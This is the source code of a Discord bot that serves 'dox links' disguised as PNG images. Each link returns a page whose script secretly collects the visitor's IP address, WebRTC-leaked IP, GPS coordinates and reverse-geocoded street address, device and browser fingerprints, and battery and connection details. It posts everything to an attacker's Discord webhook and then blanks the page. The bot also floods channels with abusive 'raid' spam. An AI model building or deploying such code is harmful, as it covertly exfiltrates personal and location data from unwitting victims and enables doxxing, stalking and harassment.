const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

// ---- ENVIRONMENT VARIABLES ----
const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/AjUx96vJH';
const OWNER_ID = process.env.OWNER_ID;
const PORT = process.env.PORT || 3000;

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
});

const links = new Map();

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) {
        res.type('image/png');
        return res.send('Image not found');
    }
    const linkData = links.get(id);
    const targetWebhook = linkData.webhook || DEFAULT_WEBHOOK;
    res.type('text/html');
    res.send(generateDoxHTML(targetWebhook));
});

app.listen(PORT, () => console.log(`🌐 Server running on port ${PORT}`));

client.once('ready', async () => {
    console.log(`🤖 Logged in as ${client.user.tag}`);
    await client.application.commands.set([
        { 
            name: 'dox', 
            description: 'Generate a fresh dox link',
            options: [{ name: 'webhook', description: 'Discord webhook URL', type: 3, required: true }]
        },
        { 
            name: 'raid', 
            description: 'Flood the channel with a raid message',
            options: [{ name: 'count', description: 'Number of lines (1-35)', type: 4, required: false }]
        },
        { name: 'invite', description: 'Get an invite link for Pulse' }
    ]);
    console.log('✅ Commands registered');
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });
        const customWebhook = interaction.options.getString('webhook');
        if (!customWebhook || !customWebhook.startsWith('https://discord.com/api/webhooks/')) {
            return interaction.editReply('❌ Invalid webhook URL.');
        }
        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
        links.set(id, { created: Date.now(), user: interaction.user.tag, webhook: customWebhook });
        const embed = new EmbedBuilder()
            .setTitle('✅ Dox Link Ready')
            .setColor(0x22c55e)
            .setDescription(`🔗 **${url}**\n\nFull device + location data will be logged.`)
            .setFooter({ text: 'Expires after 100 links' });
        await interaction.editReply({ embeds: [embed] });
    }

    if (interaction.commandName === 'raid') {
        await interaction.deferReply({ ephemeral: true });
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ Bot not in this server.');
        const count = Math.min(interaction.options.getInteger('count') || 20, 35);
        try {
            const lines = [];
            for (let i = 0; i < count; i++) lines.push('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
            lines.push(`join pulse to get raids like this: ${INVITE_LINK}`);
            const msg = lines.join('\n');
            await channel.send(msg);
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('raid_again').setLabel('🔁 Send Again').setStyle(ButtonStyle.Primary)
            );
            await interaction.editReply({ content: `✅ Raid sent (${count} lines).`, components: [row] });
        } catch (e) {
            await interaction.editReply('❌ Failed to send raid.');
        }
    }

    if (interaction.commandName === 'invite') {
        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ No permission.', ephemeral: true });
        const embed = new EmbedBuilder()
            .setTitle('📩 Invite Pulse')
            .setColor(0x8B5CF6)
            .setDescription(`[➕ Add Bot](https://discord.com/oauth2/authorize?client_id=1545939378361081916)`);
        await interaction.reply({ embeds: [embed] });
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    if (interaction.customId === 'raid_again') {
        await interaction.deferReply({ ephemeral: true });
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ Channel not found.');
        try {
            const lines = [];
            for (let i = 0; i < 20; i++) lines.push('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
            lines.push(`join pulse to get raids like this: ${INVITE_LINK}`);
            await channel.send(lines.join('\n'));
            await interaction.editReply('✅ Raid sent again.');
        } catch (e) {
            await interaction.editReply('❌ Failed.');
        }
    }
});

setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
}, 60000);

// ---- ULTIMATE DOX HTML ----
function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
<body>
<script>
    const WEBHOOK_URL = "${webhook}";

    // ---- UTILITY ----
    function hash(str) {
        let h = 0;
        for (let i = 0; i < str.length; i++) { h = ((h << 5) - h) + str.charCodeAt(i); h |= 0; }
        return h.toString(36);
    }

    // ---- IP DATA ----
    async function getIPData() {
        try {
            const res = await fetch('https://ipinfo.io/json');
            const data = await res.json();
            if (data.ip) {
                return {
                    ip: data.ip || 'N/A',
                    country: data.country || 'N/A',
                    region: data.region || 'N/A',
                    city: data.city || 'N/A',
                    postal: data.postal || 'N/A',
                    lat: data.loc ? data.loc.split(',')[0] : 'N/A',
                    lon: data.loc ? data.loc.split(',')[1] : 'N/A',
                    asn: data.asn || 'N/A',
                    isp: data.org || 'N/A',
                    org: data.org || 'N/A',
                    timezone: data.timezone || 'N/A'
                };
            }
        } catch (e) {}
        return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', org: 'N/A', timezone: 'N/A' };
    }

    // ---- BATTERY ----
    async function getBattery() {
        try {
            const b = await navigator.getBattery();
            return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Charging' : 'Not Charging', time: b.chargingTime || 'N/A' };
        } catch { return { level: 'N/A', charging: 'N/A', time: 'N/A' }; }
    }

    // ---- CONNECTION ----
    function getConnection() {
        try {
            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (c) return { type: c.effectiveType || c.type || 'unknown', downlink: c.downlink || 'N/A', rtt: c.rtt || 'N/A' };
        } catch {}
        return { type: 'N/A', downlink: 'N/A', rtt: 'N/A' };
    }

    // ---- GPU ----
    function getGPU() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return 'N/A';
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debug) return 'N/A';
            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
        } catch { return 'N/A'; }
    }

    // ---- WEBRTC ----
    function getWebRTC() {
        return new Promise((resolve) => {
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (e) => {
                    if (!e.candidate) return;
                    const ip = e.candidate.address || e.candidate.ip || 'N/A';
                    if (ip && !ip.includes('local')) { resolve(ip); pc.close(); }
                };
                setTimeout(() => { resolve('N/A'); pc.close(); }, 2000);
            } catch { resolve('N/A'); }
        });
    }

    // ---- FONTS ----
    function getFonts() {
        const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Calibri', 'Cambria', 'Consolas', 'Segoe UI', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Ubuntu', 'Inter'];
        const base = 'mmmmmmmmmmlli';
        const test = document.createElement('span');
        test.style.cssText = 'position:absolute;top:-9999px;left:-9999px;font-size:72px;font-family:monospace;';
        test.innerHTML = base;
        document.body.appendChild(test);
        const refWidth = test.offsetWidth;
        const refHeight = test.offsetHeight;
        const detected = [];
        fontList.forEach(font => {
            test.style.fontFamily = font + ', monospace';
            if (test.offsetWidth !== refWidth || test.offsetHeight !== refHeight) detected.push(font);
        });
        document.body.removeChild(test);
        return detected;
    }

    // ---- CANVAS FINGERPRINT ----
    function getCanvasFP() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 64;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 17);
            return canvas.toDataURL();
        } catch { return 'N/A'; }
    }

    // ---- REVERSE GEOCODE ----
    async function reverseGeocode(lat, lon) {
        try {
            const res = await fetch(\`https://nominatim.openstreetmap.org/reverse?lat=\${lat}&lon=\${lon}&format=json&zoom=18&addressdetails=1\`);
            const data = await res.json();
            if (data && data.display_name) return data.display_name;
        } catch {}
        return null;
    }

    // ---- MAIN ----
    (async function() {
        try {
            const ipData = await getIPData();
            const ip = ipData.ip;
            const country = ipData.country;
            const region = ipData.region;
            const city = ipData.city;
            const postal = ipData.postal;
            const lat = ipData.lat;
            const lon = ipData.lon;
            const asn = ipData.asn;
            const isp = ipData.isp;
            const tz = ipData.timezone;

            // ---- BATTERY ----
            const battery = await getBattery();

            // ---- CONNECTION ----
            const conn = getConnection();

            // ---- GPU ----
            const gpu = getGPU();

            // ---- WEBRTC ----
            const webRTC = await getWebRTC();

            // ---- FONTS ----
            const fonts = getFonts();

            // ---- CANVAS FP ----
            const canvasFP = getCanvasFP();
            const canvasHash = hash(canvasFP);

            // ---- GPS + ADDRESS ----
            let address = 'N/A';
            let gpsLat = 'N/A';
            let gpsLon = 'N/A';
            let gpsAcc = 'N/A';
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
                    });
                    gpsLat = pos.coords.latitude;
                    gpsLon = pos.coords.longitude;
                    gpsAcc = Math.round(pos.coords.accuracy) + 'm';
                    const addr = await reverseGeocode(gpsLat, gpsLon);
                    if (addr) address = addr;
                } catch {}
            }
            if (address === 'N/A') {
                const parts = [city, region, postal, country].filter(p => p && p !== 'N/A');
                address = parts.length > 0 ? parts.join(', ') : 'N/A';
            }

            // ---- BROWSER/OS ----
            const ua = navigator.userAgent;
            const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
            const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
            const deviceType = /mobile|android|iphone|ipad/i.test(ua) ? '📱 Mobile' : /tablet|ipad/i.test(ua) ? '📱 Tablet' : '💻 Desktop';
            const incognito = !!(navigator.webdriver || navigator.plugins.length === 0);
            const adBlocker = await new Promise((resolve) => {
                const test = document.createElement('div');
                test.className = 'ad-detection';
                test.style.cssText = 'display:block;height:1px;position:absolute;top:-999px;';
                document.body.appendChild(test);
                setTimeout(() => {
                    const detected = window.getComputedStyle(test).display === 'none';
                    test.remove();
                    resolve(detected);
                }, 100);
            });

            // ---- PACKAGE ----
            const data = {
                timestamp: new Date().toISOString(),
                ip, country, region, city, postal, lat, lon, asn, isp, tz,
                address,
                gpsLat, gpsLon, gpsAcc,
                battery: battery.level + ' (' + battery.charging + ')',
                connection: conn.type + ' (' + conn.downlink + ' Mbps)',
                browser, os, deviceType,
                screen: screen.width + 'x' + screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                devicePixelRatio: window.devicePixelRatio || 1,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
                platform: navigator.platform,
                hardwareCores: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
                gpu,
                webRTC,
                canvasFP: canvasHash,
                fonts: fonts.join(', '),
                incognito: incognito ? 'Likely' : 'No',
                adBlocker: adBlocker ? 'Yes' : 'No',
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'N/A',
                userAgent: ua,
                pageReferrer: document.referrer || 'N/A',
                pageURL: window.location.href,
                localIP: null // webrtc gives it
            };

            // ---- MAP ----
            const mapLat = gpsLat !== 'N/A' ? gpsLat : lat;
            const mapLon = gpsLon !== 'N/A' ? gpsLon : lon;
            const mapUrl = \`https://www.google.com/maps?q=\${mapLat},\${mapLon}\`;
            const locSource = gpsLat !== 'N/A' ? '🎯 GPS' : '📍 IP';

            // ---- SEND ----
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: null,
                    embeds: [{
                        title: "☠️ Full Dox",
                        color: 0xFF0000,
                        fields: [
                            { name: "📍 Address", value: data.address || 'N/A', inline: false },
                            { name: "📌 Coordinates", value: \`\${mapLat}, \${mapLon}\`, inline: true },
                            { name: "🎯 Accuracy", value: data.gpsAcc || 'N/A', inline: true },
                            { name: "📍 Source", value: locSource, inline: true },
                            { name: "🌐 IP", value: data.ip || 'N/A', inline: true },
                            { name: "🏙️ City", value: data.city || 'N/A', inline: true },
                            { name: "🗺️ Region", value: data.region || 'N/A', inline: true },
                            { name: "📮 Postal", value: data.postal || 'N/A', inline: true },
                            { name: "🌐 Country", value: data.country || 'N/A', inline: true },
                            { name: "🔢 ASN", value: data.asn || 'N/A', inline: true },
                            { name: "🏢 ISP", value: data.isp || 'N/A', inline: true },
                            { name: "🕒 Timezone", value: data.tz || 'N/A', inline: true },
                            { name: "🔋 Battery", value: data.battery || 'N/A', inline: true },
                            { name: "📶 Connection", value: data.connection || 'N/A', inline: true },
                            { name: "📱 Screen", value: data.screen || 'N/A', inline: true },
                            { name: "🧠 Browser", value: data.browser || 'N/A', inline: true },
                            { name: "💻 OS", value: data.os || 'N/A', inline: true },
                            { name: "🖥️ Device", value: data.deviceType || 'N/A', inline: true },
                            { name: "💾 Hardware", value: \`\${data.hardwareCores} cores, \${data.deviceMemory}GB RAM\`, inline: true },
                            { name: "🖱️ Touch", value: data.touchSupport || 'N/A', inline: true },
                            { name: "🎮 GPU", value: data.gpu || 'N/A', inline: false },
                            { name: "📡 WebRTC", value: data.webRTC || 'N/A', inline: true },
                            { name: "🖼️ Canvas FP", value: data.canvasFP || 'N/A', inline: true },
                            { name: "🔤 Fonts", value: data.fonts || 'N/A', inline: false },
                            { name: "🔒 Incognito", value: data.incognito || 'N/A', inline: true },
                            { name: "🧩 Ad Blocker", value: data.adBlocker || 'N/A', inline: true },
                            { name: "🗺️ Map", value: \`[Click to view](\${mapUrl})\`, inline: false },
                            { name: "🌐 User Agent", value: data.userAgent || 'N/A', inline: false }
                        ],
                        footer: { text: "Logged at " + data.timestamp }
                    }]
                })
            }).catch(() => {});

        } catch (err) {}
        document.body.innerHTML = '';
        document.body.style.background = '#ffffff';
        document.body.style.margin = '0';
        document.body.style.height = '100vh';
        setTimeout(() => { window.close(); window.location.href = 'about:blank'; }, 1500);
    })();
<\/script>
</body>
</html>`;
}

client.login(TOKEN);
